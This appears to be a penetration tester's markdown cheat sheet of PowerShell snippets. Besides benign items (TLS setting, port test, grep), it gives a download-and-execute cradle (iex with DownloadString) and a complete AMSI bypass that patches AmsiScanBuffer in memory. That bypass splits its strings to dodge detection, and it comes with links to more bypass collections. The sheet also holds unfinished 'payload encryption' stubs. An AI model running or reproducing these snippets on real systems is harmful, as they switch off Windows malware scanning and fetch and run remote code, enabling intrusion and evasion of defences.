# In case of issues with TLS
```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
```

# Download a script from an HTTP server
```powershell
iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/microsoft/ExPerfAnalyzer/main/ExPerfAnalyzer.ps1')
```

# Test on open/close port
```powershell
Test-NetConnection -Port 389 -InformationLevel "Detailed" <ip> 
```
- [Test-NetConnection](https://docs.microsoft.com/en-us/powershell/module/nettcpip/test-netconnection)

# Patching amsi.dll AmsiScanBuffer by rasta-mouse
```powershell
$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```
- [AMSI.fail](https://amsi.fail/)
- [Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
- [A Detailed Guide on AMSI Bypass](https://www.hackingarticles.in/a-detailed-guide-on-amsi-bypass/)
- [Small modification to Rastemouse's AmsiScanBuffer bypass to use bytes.](https://gist.github.com/FatRodzianko/c8a76537b5a87b850c7d158728717998)


# Payload encryption/decryption
## Encryption (WIP)
```powershell
$File="C:\Windows\System32\calc.exe"
#$Password = "LCSE39VzqmSL8fqE"

#$SecureStringPwd = ConvertTo-SecureString $Password -AsPlainText -Force

$RawBytes = Get-Content -Path $File -Encoding byte -Raw
#$B64RawBytes = [String][Convert]::ToBase64String($RawBytes)
#$SecureStringB64RawBytes = ConvertTo-SecureString $B64RawBytes -AsPlainText -Force

#$EncryptedRawBytes = ConvertFrom-SecureString -SecureString $SecureStringB64RawBytes -SecureKey $SecureStringPwd

# Set-Content -Encoding byte -Path "C:\calc.exe.encrypted" -Value $SecureStringB64RawBytes

$BinaryWriter = [System.IO.BinaryWriter]::new([System.IO.File]::Create("C:\calc.exe.encrypted"))
$BinaryWriter.Write($RawBytes)
$BinaryWriter.Close()
```
## Decryption (WIP)
```powershell
$File = "C:\calc.exe.encrypted"
# $Password = "LCSE39VzqmSL8fqE"
# $SecureStringPwd = ConvertTo-SecureString $Password -AsPlainText -Force

$EncryptedRawBytes = Get-Content -Path $File -Encoding byte -Raw
# $SecureStringData = ConvertTo-SecureString -String $EncryptedData -SecureKey $SecureStringPwd

# $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecureStringData)
# $UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)

# Set-Content -Encoding byte -Path "C:\calc.exe" -Value $EncryptedData

$BinaryWriter = [System.IO.BinaryWriter]::new([System.IO.File]::Create("C:\calc.exe"))
$BinaryWriter.Write($EncryptedRawBytes)
$BinaryWriter.Close()
```

# How to grep in PowerShell 
```powershell
Select-String -Path "*.log" -Pattern "EMAIL_ADDRESS"
```
- [How to Use PowerShell Grep (Select-String)](https://adamtheautomator.com/powershell-grep/)
